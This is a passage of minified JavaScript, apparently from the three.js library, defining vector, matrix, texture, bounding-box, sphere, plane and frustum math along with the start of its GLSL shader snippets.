0!==e?this.addVectors(t,e):(this.x+=t.x,this.y+=t.y,this.z+=t.z,this)},addScalar:function(t){return this.x+=t,this.y+=t,this.z+=t,this},addVectors:function(t,e){return this.x=t.x+e.x,this.y=t.y+e.y,this.z=t.z+e.z,this},addScaledVector:function(t,e){return this.x+=t.x*e,this.y+=t.y*e,this.z+=t.z*e,this},sub:function(t,e){return void 0!==e?this.subVectors(t,e):(this.x-=t.x,this.y-=t.y,this.z-=t.z,this)},subScalar:function(t){return this.x-=t,this.y-=t,this.z-=t,this},subVectors:function(t,e){return this.x=t.x-e.x,this.y=t.y-e.y,this.z=t.z-e.z,this},multiply:function(t,e){return void 0!==e?this.multiplyVectors(t,e):(this.x*=t.x,this.y*=t.y,this.z*=t.z,this)},multiplyScalar:function(t){return this.x*=t,this.y*=t,this.z*=t,this},multiplyVectors:function(t,e){return this.x=t.x*e.x,this.y=t.y*e.y,this.z=t.z*e.z,this},applyEuler:(wt=new te,function(t){return!t||t.isEuler,this.applyQuaternion(wt.setFromEuler(t))}),applyAxisAngle:function(){var t=new te;return function(e,i){return this.applyQuaternion(t.setFromAxisAngle(e,i))}}(),applyMatrix3:function(t){var e=this.x,i=this.y,n=this.z,r=t.elements;return this.x=r[0]*e+r[3]*i+r[6]*n,this.y=r[1]*e+r[4]*i+r[7]*n,this.z=r[2]*e+r[5]*i+r[8]*n,this},applyMatrix4:function(t){var e=this.x,i=this.y,n=this.z,r=t.elements,a=1/(r[3]*e+r[7]*i+r[11]*n+r[15]);return this.x=(r[0]*e+r[4]*i+r[8]*n+r[12])*a,this.y=(r[1]*e+r[5]*i+r[9]*n+r[13])*a,this.z=(r[2]*e+r[6]*i+r[10]*n+r[14])*a,this},applyQuaternion:function(t){var e=this.x,i=this.y,n=this.z,r=t.x,a=t.y,o=t.z,s=t.w,l=s*e+a*n-o*i,c=s*i+o*e-r*n,h=s*n+r*i-a*e,u=-r*e-a*i-o*n;return this.x=l*s+u*-r+c*-o-h*-a,this.y=c*s+u*-a+h*-r-l*-o,this.z=h*s+u*-o+l*-a-c*-r,this},project:function(t){return this.applyMatrix4(t.matrixWorldInverse).applyMatrix4(t.projectionMatrix)},unproject:function(){var t=new Qt;return function(e){return this.applyMatrix4(t.getInverse(e.projectionMatrix)).applyMatrix4(e.matrixWorld)}}(),transformDirection:function(t){var e=this.x,i=this.y,n=this.z,r=t.elements;return this.x=r[0]*e+r[4]*i+r[8]*n,this.y=r[1]*e+r[5]*i+r[9]*n,this.z=r[2]*e+r[6]*i+r[10]*n,this.normalize()},divide:function(t){return this.x/=t.x,this.y/=t.y,this.z/=t.z,this},divideScalar:function(t){return this.multiplyScalar(1/t)},min:function(t){return this.x=Math.min(this.x,t.x),this.y=Math.min(this.y,t.y),this.z=Math.min(this.z,t.z),this},max:function(t){return this.x=Math.max(this.x,t.x),this.y=Math.max(this.y,t.y),this.z=Math.max(this.z,t.z),this},clamp:function(t,e){return this.x=Math.max(t.x,Math.min(e.x,this.x)),this.y=Math.max(t.y,Math.min(e.y,this.y)),this.z=Math.max(t.z,Math.min(e.z,this.z)),this},clampScalar:function(){var t=new ee,e=new ee;return function(i,n){return t.set(i,i,i),e.set(n,n,n),this.clamp(t,e)}}(),clampLength:function(t,e){var i=this.length();return this.divideScalar(i||1).multiplyScalar(Math.max(t,Math.min(e,i)))},floor:function(){return this.x=Math.floor(this.x),this.y=Math.floor(this.y),this.z=Math.floor(this.z),this},ceil:function(){return this.x=Math.ceil(this.x),this.y=Math.ceil(this.y),this.z=Math.ceil(this.z),this},round:function(){return this.x=Math.round(this.x),this.y=Math.round(this.y),this.z=Math.round(this.z),this},roundToZero:function(){return this.x=this.x<0?Math.ceil(this.x):Math.floor(this.x),this.y=this.y<0?Math.ceil(this.y):Math.floor(this.y),this.z=this.z<0?Math.ceil(this.z):Math.floor(this.z),this},negate:function(){return this.x=-this.x,this.y=-this.y,this.z=-this.z,this},dot:function(t){return this.x*t.x+this.y*t.y+this.z*t.z},lengthSq:function(){return this.x*this.x+this.y*this.y+this.z*this.z},length:function(){return Math.sqrt(this.x*this.x+this.y*this.y+this.z*this.z)},manhattanLength:function(){return Math.abs(this.x)+Math.abs(this.y)+Math.abs(this.z)},normalize:function(){return this.divideScalar(this.length()||1)},setLength:function(t){return this.normalize().multiplyScalar(t)},lerp:function(t,e){return this.x+=(t.x-this.x)*e,this.y+=(t.y-this.y)*e,this.z+=(t.z-this.z)*e,this},lerpVectors:function(t,e,i){return this.subVectors(e,t).multiplyScalar(i).add(t)},cross:function(t,e){return void 0!==e?this.crossVectors(t,e):this.crossVectors(this,t)},crossVectors:function(t,e){var i=t.x,n=t.y,r=t.z,a=e.x,o=e.y,s=e.z;return this.x=n*s-r*o,this.y=r*a-i*s,this.z=i*o-n*a,this},projectOnVector:function(t){var e=t.dot(this)/t.lengthSq();return this.copy(t).multiplyScalar(e)},projectOnPlane:function(){var t=new ee;return function(e){return t.copy(this).projectOnVector(e),this.sub(t)}}(),reflect:function(){var t=new ee;return function(e){return this.sub(t.copy(e).multiplyScalar(2*this.dot(e)))}}(),angleTo:function(t){var e=this.dot(t)/Math.sqrt(this.lengthSq()*t.lengthSq());return Math.acos(Zt.clamp(e,-1,1))},distanceTo:function(t){return Math.sqrt(this.distanceToSquared(t))},distanceToSquared:function(t){var e=this.x-t.x,i=this.y-t.y,n=this.z-t.z;return e*e+i*i+n*n},manhattanDistanceTo:function(t){return Math.abs(this.x-t.x)+Math.abs(this.y-t.y)+Math.abs(this.z-t.z)},setFromSpherical:function(t){return this.setFromSphericalCoords(t.radius,t.phi,t.theta)},setFromSphericalCoords:function(t,e,i){var n=Math.sin(e)*t;return this.x=n*Math.sin(i),this.y=Math.cos(e)*t,this.z=n*Math.cos(i),this},setFromCylindrical:function(t){return this.setFromCylindricalCoords(t.radius,t.theta,t.y)},setFromCylindricalCoords:function(t,e,i){return this.x=t*Math.sin(e),this.y=i,this.z=t*Math.cos(e),this},setFromMatrixPosition:function(t){var e=t.elements;return this.x=e[12],this.y=e[13],this.z=e[14],this},setFromMatrixScale:function(t){var e=this.setFromMatrixColumn(t,0).length(),i=this.setFromMatrixColumn(t,1).length(),n=this.setFromMatrixColumn(t,2).length();return this.x=e,this.y=i,this.z=n,this},setFromMatrixColumn:function(t,e){return this.fromArray(t.elements,4*e)},equals:function(t){return t.x===this.x&&t.y===this.y&&t.z===this.z},fromArray:function(t,e){return void 0===e&&(e=0),this.x=t[e],this.y=t[e+1],this.z=t[e+2],this},toArray:function(t,e){return void 0===t&&(t=[]),void 0===e&&(e=0),t[e]=this.x,t[e+1]=this.y,t[e+2]=this.z,t},fromBufferAttribute:function(t,e,i){return this.x=t.getX(e),this.y=t.getY(e),this.z=t.getZ(e),this}}),Object.assign(ie.prototype,{isMatrix3:!0,set:function(t,e,i,n,r,a,o,s,l){var c=this.elements;return c[0]=t,c[1]=n,c[2]=o,c[3]=e,c[4]=r,c[5]=s,c[6]=i,c[7]=a,c[8]=l,this},identity:function(){return this.set(1,0,0,0,1,0,0,0,1),this},clone:function(){return(new this.constructor).fromArray(this.elements)},copy:function(t){var e=this.elements,i=t.elements;return e[0]=i[0],e[1]=i[1],e[2]=i[2],e[3]=i[3],e[4]=i[4],e[5]=i[5],e[6]=i[6],e[7]=i[7],e[8]=i[8],this},setFromMatrix4:function(t){var e=t.elements;return this.set(e[0],e[4],e[8],e[1],e[5],e[9],e[2],e[6],e[10]),this},applyToBufferAttribute:function(){var t=new ee;return function(e){for(var i=0,n=e.count;i<n;i++)t.x=e.getX(i),t.y=e.getY(i),t.z=e.getZ(i),t.applyMatrix3(this),e.setXYZ(i,t.x,t.y,t.z);return e}}(),multiply:function(t){return this.multiplyMatrices(this,t)},premultiply:function(t){return this.multiplyMatrices(t,this)},multiplyMatrices:function(t,e){var i=t.elements,n=e.elements,r=this.elements,a=i[0],o=i[3],s=i[6],l=i[1],c=i[4],h=i[7],u=i[2],d=i[5],p=i[8],f=n[0],m=n[3],_=n[6],g=n[1],v=n[4],y=n[7],x=n[2],b=n[5],w=n[8];return r[0]=a*f+o*g+s*x,r[3]=a*m+o*v+s*b,r[6]=a*_+o*y+s*w,r[1]=l*f+c*g+h*x,r[4]=l*m+c*v+h*b,r[7]=l*_+c*y+h*w,r[2]=u*f+d*g+p*x,r[5]=u*m+d*v+p*b,r[8]=u*_+d*y+p*w,this},multiplyScalar:function(t){var e=this.elements;return e[0]*=t,e[3]*=t,e[6]*=t,e[1]*=t,e[4]*=t,e[7]*=t,e[2]*=t,e[5]*=t,e[8]*=t,this},determinant:function(){var t=this.elements,e=t[0],i=t[1],n=t[2],r=t[3],a=t[4],o=t[5],s=t[6],l=t[7],c=t[8];return e*a*c-e*o*l-i*r*c+i*o*s+n*r*l-n*a*s},getInverse:function(t,e){t&&t.isMatrix4;var i=t.elements,n=this.elements,r=i[0],a=i[1],o=i[2],s=i[3],l=i[4],c=i[5],h=i[6],u=i[7],d=i[8],p=d*l-c*u,f=c*h-d*s,m=u*s-l*h,_=r*p+a*f+o*m;if(0===_){if(!0===e)throw new Error("Matrix3: .getInverse() can't invert matrix, determinant is 0");return this.identity()}var g=1/_;return n[0]=p*g,n[1]=(o*u-d*a)*g,n[2]=(c*a-o*l)*g,n[3]=f*g,n[4]=(d*r-o*h)*g,n[5]=(o*s-c*r)*g,n[6]=m*g,n[7]=(a*h-u*r)*g,n[8]=(l*r-a*s)*g,this},transpose:function(){var t,e=this.elements;return t=e[1],e[1]=e[3],e[3]=t,t=e[2],e[2]=e[6],e[6]=t,t=e[5],e[5]=e[7],e[7]=t,this},getNormalMatrix:function(t){return this.setFromMatrix4(t).getInverse(this).transpose()},transposeIntoArray:function(t){var e=this.elements;return t[0]=e[0],t[1]=e[3],t[2]=e[6],t[3]=e[1],t[4]=e[4],t[5]=e[7],t[6]=e[2],t[7]=e[5],t[8]=e[8],this},setUvTransform:function(t,e,i,n,r,a,o){var s=Math.cos(r),l=Math.sin(r);this.set(i*s,i*l,-i*(s*a+l*o)+a+t,-n*l,n*s,-n*(-l*a+s*o)+o+e,0,0,1)},scale:function(t,e){var i=this.elements;return i[0]*=t,i[3]*=t,i[6]*=t,i[1]*=e,i[4]*=e,i[7]*=e,this},rotate:function(t){var e=Math.cos(t),i=Math.sin(t),n=this.elements,r=n[0],a=n[3],o=n[6],s=n[1],l=n[4],c=n[7];return n[0]=e*r+i*s,n[3]=e*a+i*l,n[6]=e*o+i*c,n[1]=-i*r+e*s,n[4]=-i*a+e*l,n[7]=-i*o+e*c,this},translate:function(t,e){var i=this.elements;return i[0]+=t*i[2],i[3]+=t*i[5],i[6]+=t*i[8],i[1]+=e*i[2],i[4]+=e*i[5],i[7]+=e*i[8],this},equals:function(t){for(var e=this.elements,i=t.elements,n=0;n<9;n++)if(e[n]!==i[n])return!1;return!0},fromArray:function(t,e){void 0===e&&(e=0);for(var i=0;i<9;i++)this.elements[i]=t[i+e];return this},toArray:function(t,e){void 0===t&&(t=[]),void 0===e&&(e=0);var i=this.elements;return t[e]=i[0],t[e+1]=i[1],t[e+2]=i[2],t[e+3]=i[3],t[e+4]=i[4],t[e+5]=i[5],t[e+6]=i[6],t[e+7]=i[7],t[e+8]=i[8],t}});var ne,re,ae,oe,se,le=function(t){var e;if("undefined"==typeof HTMLCanvasElement)return t.src;if(t instanceof HTMLCanvasElement)e=t;else{void 0===Tt&&(Tt=document.createElementNS("http://www.w3.org/1999/xhtml","canvas")),Tt.width=t.width,Tt.height=t.height;var i=Tt.getContext("2d");t instanceof ImageData?i.putImageData(t,0,0):i.drawImage(t,0,0,t.width,t.height),e=Tt}return e.width>2048||e.height>2048?e.toDataURL("image/jpeg",.6):e.toDataURL("image/png")},ce=0;function he(t,e,i,n,r,a,o,s,l,c){Object.defineProperty(this,"id",{value:ce++}),this.uuid=Zt.generateUUID(),this.name="",this.image=void 0!==t?t:he.DEFAULT_IMAGE,this.mipmaps=[],this.mapping=void 0!==e?e:he.DEFAULT_MAPPING,this.wrapS=void 0!==i?i:kt,this.wrapT=void 0!==n?n:kt,this.magFilter=void 0!==r?r:Rt,this.minFilter=void 0!==a?a:It,this.anisotropy=void 0!==l?l:1,this.format=void 0!==o?o:Bt,this.type=void 0!==s?s:Ft,this.offset=new Jt(0,0),this.repeat=new Jt(1,1),this.center=new Jt(0,0),this.rotation=0,this.matrixAutoUpdate=!0,this.matrix=new ie,this.generateMipmaps=!0,this.premultiplyAlpha=!1,this.flipY=!0,this.unpackAlignment=4,this.encoding=void 0!==c?c:$t,this.version=0,this.onUpdate=null}function ue(t,e,i,n,r,a,o,s,l,c,h,u){he.call(this,null,a,o,s,l,c,n,r,h,u),this.image={data:t,width:e,height:i},this.magFilter=void 0!==l?l:Pt,this.minFilter=void 0!==c?c:Pt,this.generateMipmaps=!1,this.flipY=!1,this.unpackAlignment=1}function de(t,e){this.min=void 0!==t?t:new ee(1/0,1/0,1/0),this.max=void 0!==e?e:new ee(-1/0,-1/0,-1/0)}function pe(t,e){this.center=void 0!==t?t:new ee,this.radius=void 0!==e?e:0}function fe(t,e){this.normal=void 0!==t?t:new ee(1,0,0),this.constant=void 0!==e?e:0}function me(t,e,i,n,r,a){this.planes=[void 0!==t?t:new fe,void 0!==e?e:new fe,void 0!==i?i:new fe,void 0!==n?n:new fe,void 0!==r?r:new fe,void 0!==a?a:new fe]}he.DEFAULT_IMAGE=void 0,he.DEFAULT_MAPPING=300,he.prototype=Object.assign(Object.create(Kt.prototype),{constructor:he,isTexture:!0,updateMatrix:function(){this.matrix.setUvTransform(this.offset.x,this.offset.y,this.repeat.x,this.repeat.y,this.rotation,this.center.x,this.center.y)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.name=t.name,this.image=t.image,this.mipmaps=t.mipmaps.slice(0),this.mapping=t.mapping,this.wrapS=t.wrapS,this.wrapT=t.wrapT,this.magFilter=t.magFilter,this.minFilter=t.minFilter,this.anisotropy=t.anisotropy,this.format=t.format,this.type=t.type,this.offset.copy(t.offset),this.repeat.copy(t.repeat),this.center.copy(t.center),this.rotation=t.rotation,this.matrixAutoUpdate=t.matrixAutoUpdate,this.matrix.copy(t.matrix),this.generateMipmaps=t.generateMipmaps,this.premultiplyAlpha=t.premultiplyAlpha,this.flipY=t.flipY,this.unpackAlignment=t.unpackAlignment,this.encoding=t.encoding,this},toJSON:function(t){var e=void 0===t||"string"==typeof t;if(!e&&void 0!==t.textures[this.uuid])return t.textures[this.uuid];var i={metadata:{version:4.5,type:"Texture",generator:"Texture.toJSON"},uuid:this.uuid,name:this.name,mapping:this.mapping,repeat:[this.repeat.x,this.repeat.y],offset:[this.offset.x,this.offset.y],center:[this.center.x,this.center.y],rotation:this.rotation,wrap:[this.wrapS,this.wrapT],format:this.format,type:this.type,encoding:this.encoding,minFilter:this.minFilter,magFilter:this.magFilter,anisotropy:this.anisotropy,flipY:this.flipY,premultiplyAlpha:this.premultiplyAlpha,unpackAlignment:this.unpackAlignment};if(void 0!==this.image){var n=this.image;if(void 0===n.uuid&&(n.uuid=Zt.generateUUID()),!e&&void 0===t.images[n.uuid]){var r;if(Array.isArray(n)){r=[];for(var a=0,o=n.length;a<o;a++)r.push(le(n[a]))}else r=le(n);t.images[n.uuid]={uuid:n.uuid,url:r}}i.image=n.uuid}return e||(t.textures[this.uuid]=i),i},dispose:function(){this.dispatchEvent({type:"dispose"})},transformUv:function(t){if(300!==this.mapping)return t;if(t.applyMatrix3(this.matrix),t.x<0||t.x>1)switch(this.wrapS){case Lt:t.x=t.x-Math.floor(t.x);break;case kt:t.x=t.x<0?0:1;break;case At:1===Math.abs(Math.floor(t.x)%2)?t.x=Math.ceil(t.x)-t.x:t.x=t.x-Math.floor(t.x)}if(t.y<0||t.y>1)switch(this.wrapT){case Lt:t.y=t.y-Math.floor(t.y);break;case kt:t.y=t.y<0?0:1;break;case At:1===Math.abs(Math.floor(t.y)%2)?t.y=Math.ceil(t.y)-t.y:t.y=t.y-Math.floor(t.y)}return this.flipY&&(t.y=1-t.y),t}}),Object.defineProperty(he.prototype,"needsUpdate",{set:function(t){!0===t&&this.version++}}),ue.prototype=Object.create(he.prototype),ue.prototype.constructor=ue,ue.prototype.isDataTexture=!0,Object.assign(de.prototype,{isBox3:!0,set:function(t,e){return this.min.copy(t),this.max.copy(e),this},setFromArray:function(t){for(var e=1/0,i=1/0,n=1/0,r=-1/0,a=-1/0,o=-1/0,s=0,l=t.length;s<l;s+=3){var c=t[s],h=t[s+1],u=t[s+2];c<e&&(e=c),h<i&&(i=h),u<n&&(n=u),c>r&&(r=c),h>a&&(a=h),u>o&&(o=u)}return this.min.set(e,i,n),this.max.set(r,a,o),this},setFromBufferAttribute:function(t){for(var e=1/0,i=1/0,n=1/0,r=-1/0,a=-1/0,o=-1/0,s=0,l=t.count;s<l;s++){var c=t.getX(s),h=t.getY(s),u=t.getZ(s);c<e&&(e=c),h<i&&(i=h),u<n&&(n=u),c>r&&(r=c),h>a&&(a=h),u>o&&(o=u)}return this.min.set(e,i,n),this.max.set(r,a,o),this},setFromPoints:function(t){this.makeEmpty();for(var e=0,i=t.length;e<i;e++)this.expandByPoint(t[e]);return this},setFromCenterAndSize:function(){var t=new ee;return function(e,i){var n=t.copy(i).multiplyScalar(.5);return this.min.copy(e).sub(n),this.max.copy(e).add(n),this}}(),setFromObject:function(t){return this.makeEmpty(),this.expandByObject(t)},clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.min.copy(t.min),this.max.copy(t.max),this},makeEmpty:function(){return this.min.x=this.min.y=this.min.z=1/0,this.max.x=this.max.y=this.max.z=-1/0,this},isEmpty:function(){return this.max.x<this.min.x||this.max.y<this.min.y||this.max.z<this.min.z},getCenter:function(t){return void 0===t&&(t=new ee),this.isEmpty()?t.set(0,0,0):t.addVectors(this.min,this.max).multiplyScalar(.5)},getSize:function(t){return void 0===t&&(t=new ee),this.isEmpty()?t.set(0,0,0):t.subVectors(this.max,this.min)},expandByPoint:function(t){return this.min.min(t),this.max.max(t),this},expandByVector:function(t){return this.min.sub(t),this.max.add(t),this},expandByScalar:function(t){return this.min.addScalar(-t),this.max.addScalar(t),this},expandByObject:function(){var t,e,i,n=new ee;function r(r){var a=r.geometry;if(void 0!==a)if(a.isGeometry){var o=a.vertices;for(e=0,i=o.length;e<i;e++)n.copy(o[e]),n.applyMatrix4(r.matrixWorld),t.expandByPoint(n)}else if(a.isBufferGeometry){var s=a.attributes.position;if(void 0!==s)for(e=0,i=s.count;e<i;e++)n.fromBufferAttribute(s,e).applyMatrix4(r.matrixWorld),t.expandByPoint(n)}}return function(e){return t=this,e.updateMatrixWorld(!0),e.traverse(r),this}}(),containsPoint:function(t){return!(t.x<this.min.x||t.x>this.max.x||t.y<this.min.y||t.y>this.max.y||t.z<this.min.z||t.z>this.max.z)},containsBox:function(t){return this.min.x<=t.min.x&&t.max.x<=this.max.x&&this.min.y<=t.min.y&&t.max.y<=this.max.y&&this.min.z<=t.min.z&&t.max.z<=this.max.z},getParameter:function(t,e){return void 0===e&&(e=new ee),e.set((t.x-this.min.x)/(this.max.x-this.min.x),(t.y-this.min.y)/(this.max.y-this.min.y),(t.z-this.min.z)/(this.max.z-this.min.z))},intersectsBox:function(t){return!(t.max.x<this.min.x||t.min.x>this.max.x||t.max.y<this.min.y||t.min.y>this.max.y||t.max.z<this.min.z||t.min.z>this.max.z)},intersectsSphere:(re=new ee,function(t){return this.clampPoint(t.center,re),re.distanceToSquared(t.center)<=t.radius*t.radius}),intersectsPlane:function(t){var e,i;return t.normal.x>0?(e=t.normal.x*this.min.x,i=t.normal.x*this.max.x):(e=t.normal.x*this.max.x,i=t.normal.x*this.min.x),t.normal.y>0?(e+=t.normal.y*this.min.y,i+=t.normal.y*this.max.y):(e+=t.normal.y*this.max.y,i+=t.normal.y*this.min.y),t.normal.z>0?(e+=t.normal.z*this.min.z,i+=t.normal.z*this.max.z):(e+=t.normal.z*this.max.z,i+=t.normal.z*this.min.z),e<=-t.constant&&i>=-t.constant},intersectsTriangle:function(){var t=new ee,e=new ee,i=new ee,n=new ee,r=new ee,a=new ee,o=new ee,s=new ee,l=new ee,c=new ee;function h(n){var r,a;for(r=0,a=n.length-3;r<=a;r+=3){o.fromArray(n,r);var s=l.x*Math.abs(o.x)+l.y*Math.abs(o.y)+l.z*Math.abs(o.z),c=t.dot(o),h=e.dot(o),u=i.dot(o);if(Math.max(-Math.max(c,h,u),Math.min(c,h,u))>s)return!1}return!0}return function(o){if(this.isEmpty())return!1;this.getCenter(s),l.subVectors(this.max,s),t.subVectors(o.a,s),e.subVectors(o.b,s),i.subVectors(o.c,s),n.subVectors(e,t),r.subVectors(i,e),a.subVectors(t,i);var u=[0,-n.z,n.y,0,-r.z,r.y,0,-a.z,a.y,n.z,0,-n.x,r.z,0,-r.x,a.z,0,-a.x,-n.y,n.x,0,-r.y,r.x,0,-a.y,a.x,0];return!!h(u)&&!!h(u=[1,0,0,0,1,0,0,0,1])&&(c.crossVectors(n,r),h(u=[c.x,c.y,c.z]))}}(),clampPoint:function(t,e){return void 0===e&&(e=new ee),e.copy(t).clamp(this.min,this.max)},distanceToPoint:function(){var t=new ee;return function(e){return t.copy(e).clamp(this.min,this.max).sub(e).length()}}(),getBoundingSphere:function(){var t=new ee;return function(e){return void 0===e&&(e=new pe),this.getCenter(e.center),e.radius=.5*this.getSize(t).length(),e}}(),intersect:function(t){return this.min.max(t.min),this.max.min(t.max),this.isEmpty()&&this.makeEmpty(),this},union:function(t){return this.min.min(t.min),this.max.max(t.max),this},applyMatrix4:(ne=[new ee,new ee,new ee,new ee,new ee,new ee,new ee,new ee],function(t){return this.isEmpty()||(ne[0].set(this.min.x,this.min.y,this.min.z).applyMatrix4(t),ne[1].set(this.min.x,this.min.y,this.max.z).applyMatrix4(t),ne[2].set(this.min.x,this.max.y,this.min.z).applyMatrix4(t),ne[3].set(this.min.x,this.max.y,this.max.z).applyMatrix4(t),ne[4].set(this.max.x,this.min.y,this.min.z).applyMatrix4(t),ne[5].set(this.max.x,this.min.y,this.max.z).applyMatrix4(t),ne[6].set(this.max.x,this.max.y,this.min.z).applyMatrix4(t),ne[7].set(this.max.x,this.max.y,this.max.z).applyMatrix4(t),this.setFromPoints(ne)),this}),translate:function(t){return this.min.add(t),this.max.add(t),this},equals:function(t){return t.min.equals(this.min)&&t.max.equals(this.max)}}),Object.assign(pe.prototype,{set:function(t,e){return this.center.copy(t),this.radius=e,this},setFromPoints:(ae=new de,function(t,e){var i=this.center;void 0!==e?i.copy(e):ae.setFromPoints(t).getCenter(i);for(var n=0,r=0,a=t.length;r<a;r++)n=Math.max(n,i.distanceToSquared(t[r]));return this.radius=Math.sqrt(n),this}),clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.center.copy(t.center),this.radius=t.radius,this},empty:function(){return this.radius<=0},containsPoint:function(t){return t.distanceToSquared(this.center)<=this.radius*this.radius},distanceToPoint:function(t){return t.distanceTo(this.center)-this.radius},intersectsSphere:function(t){var e=this.radius+t.radius;return t.center.distanceToSquared(this.center)<=e*e},intersectsBox:function(t){return t.intersectsSphere(this)},intersectsPlane:function(t){return Math.abs(t.distanceToPoint(this.center))<=this.radius},clampPoint:function(t,e){var i=this.center.distanceToSquared(t);return void 0===e&&(e=new ee),e.copy(t),i>this.radius*this.radius&&(e.sub(this.center).normalize(),e.multiplyScalar(this.radius).add(this.center)),e},getBoundingBox:function(t){return void 0===t&&(t=new de),t.set(this.center,this.center),t.expandByScalar(this.radius),t},applyMatrix4:function(t){return this.center.applyMatrix4(t),this.radius=this.radius*t.getMaxScaleOnAxis(),this},translate:function(t){return this.center.add(t),this},equals:function(t){return t.center.equals(this.center)&&t.radius===this.radius}}),Object.assign(fe.prototype,{set:function(t,e){return this.normal.copy(t),this.constant=e,this},setComponents:function(t,e,i,n){return this.normal.set(t,e,i),this.constant=n,this},setFromNormalAndCoplanarPoint:function(t,e){return this.normal.copy(t),this.constant=-e.dot(this.normal),this},setFromCoplanarPoints:function(){var t=new ee,e=new ee;return function(i,n,r){var a=t.subVectors(r,n).cross(e.subVectors(i,n)).normalize();return this.setFromNormalAndCoplanarPoint(a,i),this}}(),clone:function(){return(new this.constructor).copy(this)},copy:function(t){return this.normal.copy(t.normal),this.constant=t.constant,this},normalize:function(){var t=1/this.normal.length();return this.normal.multiplyScalar(t),this.constant*=t,this},negate:function(){return this.constant*=-1,this.normal.negate(),this},distanceToPoint:function(t){return this.normal.dot(t)+this.constant},distanceToSphere:function(t){return this.distanceToPoint(t.center)-t.radius},projectPoint:function(t,e){return void 0===e&&(e=new ee),e.copy(this.normal).multiplyScalar(-this.distanceToPoint(t)).add(t)},intersectLine:function(){var t=new ee;return function(e,i){void 0===i&&(i=new ee);var n=e.delta(t),r=this.normal.dot(n);if(0===r)return 0===this.distanceToPoint(e.start)?i.copy(e.start):void 0;var a=-(e.start.dot(this.normal)+this.constant)/r;return a<0||a>1?void 0:i.copy(n).multiplyScalar(a).add(e.start)}}(),intersectsLine:function(t){var e=this.distanceToPoint(t.start),i=this.distanceToPoint(t.end);return e<0&&i>0||i<0&&e>0},intersectsBox:function(t){return t.intersectsPlane(this)},intersectsSphere:function(t){return t.intersectsPlane(this)},coplanarPoint:function(t){return void 0===t&&(t=new ee),t.copy(this.normal).multiplyScalar(-this.constant)},applyMatrix4:function(){var t=new ee,e=new ie;return function(i,n){var r=n||e.getNormalMatrix(i),a=this.coplanarPoint(t).applyMatrix4(i),o=this.normal.applyMatrix3(r).normalize();return this.constant=-a.dot(o),this}}(),translate:function(t){return this.constant-=t.dot(this.normal),this},equals:function(t){return t.normal.equals(this.normal)&&t.constant===this.constant}}),Object.assign(me.prototype,{set:function(t,e,i,n,r,a){var o=this.planes;return o[0].copy(t),o[1].copy(e),o[2].copy(i),o[3].copy(n),o[4].copy(r),o[5].copy(a),this},clone:function(){return(new this.constructor).copy(this)},copy:function(t){for(var e=this.planes,i=0;i<6;i++)e[i].copy(t.planes[i]);return this},setFromMatrix:function(t){var e=this.planes,i=t.elements,n=i[0],r=i[1],a=i[2],o=i[3],s=i[4],l=i[5],c=i[6],h=i[7],u=i[8],d=i[9],p=i[10],f=i[11],m=i[12],_=i[13],g=i[14],v=i[15];return e[0].setComponents(o-n,h-s,f-u,v-m).normalize(),e[1].setComponents(o+n,h+s,f+u,v+m).normalize(),e[2].setComponents(o+r,h+l,f+d,v+_).normalize(),e[3].setComponents(o-r,h-l,f-d,v-_).normalize(),e[4].setComponents(o-a,h-c,f-p,v-g).normalize(),e[5].setComponents(o+a,h+c,f+p,v+g).normalize(),this},intersectsObject:(se=new pe,function(t){var e=t.geometry;return null===e.boundingSphere&&e.computeBoundingSphere(),se.copy(e.boundingSphere).applyMatrix4(t.matrixWorld),this.intersectsSphere(se)}),intersectsSprite:function(){var t=new pe;return function(e){return t.center.set(0,0,0),t.radius=.7071067811865476,t.applyMatrix4(e.matrixWorld),this.intersectsSphere(t)}}(),intersectsSphere:function(t){for(var e=this.planes,i=t.center,n=-t.radius,r=0;r<6;r++)if(e[r].distanceToPoint(i)<n)return!1;return!0},intersectsBox:(oe=new ee,function(t){for(var e=this.planes,i=0;i<6;i++){var n=e[i];if(oe.x=n.normal.x>0?t.max.x:t.min.x,oe.y=n.normal.y>0?t.max.y:t.min.y,oe.z=n.normal.z>0?t.max.z:t.min.z,n.distanceToPoint(oe)<0)return!1}return!0}),containsPoint:function(t){for(var e=this.planes,i=0;i<6;i++)if(e[i].distanceToPoint(t)<0)return!1;return!0}});var _e,ge,ve,ye={alphamap_fragment:"\n#ifdef USE_ALPHAMAP\n\n\tdiffuseColor.a *= texture2D( alphaMap, vUv ).g;\n\n#endif\n",alphamap_pars_fragment:"\n#ifdef USE_ALPHAMAP\n\n\tuniform sampler2D alphaMap;\n\n#endif\n",alphatest_fragment:"\n#ifdef ALPHATEST\n\n\tif ( diffuseColor.a < ALPHATEST ) discard;\n\n#endif\n",aomap_fragment:"\n#ifdef USE_AOMAP\n\n\t// reads channel R, compatible with a combined OcclusionRoughnessMetallic (RGB) texture\n\tfloat ambientOcclusion = ( texture2D( aoMap, vUv2 ).r - 1.0 ) * aoMapIntensity + 1.0;\n\n\treflectedLight.indirectDiffuse *= ambientOcclusion;\n\n\t#if defined( USE_ENVMAP ) && defined( PHYSICAL )\n\n\t\tfloat dotNV = saturate( dot( geometry.normal, geometry.viewDir ) );\n\n\t\treflectedLight.indirectSpecular *= computeSpecularOcclusion( dotNV, ambientOcclusion, material.specularRoughness );\n\n\t#endif\n\n#endif\n",aomap_pars_fragment:"\n#ifdef USE_AOMAP\n\n\tuniform sampler2D aoMap;\n\tuniform float aoMapIntensity;\n\n#endif\n",begin_vertex:"\nvec3 transformed = vec3( position );\n",beginnormal_vertex:"\nvec3 objectNormal = vec3( normal );\n\n#ifdef USE_TANGENT\n\n\tvec3 objectTangent = vec3( tangent.xyz );\n\n#endif\n",bsdfs:'\n\n// Analytical approximation of the DFG LUT, one half of the\n// split-sum approximation used in indirect specular lighting.\n// via \'environmentBRDF\' from "Physically Based Shading on Mobile"\n// https://www.unrealengine.com/blog/physically-based-shading-on-mobile - environmentBRDF for GGX on mobile\nvec2 integrateSpecularBRDF( const in float dotNV, const in float roughness ) {\n\tconst vec4 c0 = vec4( - 1, - 0.0275, - 0.572, 0.022 );\n\n\tconst vec4 c1 = vec4( 1, 0.0425, 1.04, - 0.04 );\n\n\tvec4 r = roughness * c0 + c1;\n\n\tfloat a004 = min( r.x * r.x, exp2( - 9.28 * dotNV ) ) * r.x + r.y;\n\n\treturn vec2( -1.04, 1.04 ) * a004 + r.zw;\n\n}\n\nfloat punctualLightIntensityToIrradianceFactor( const in float lightDistance, const in float cutoffDistance, const in float 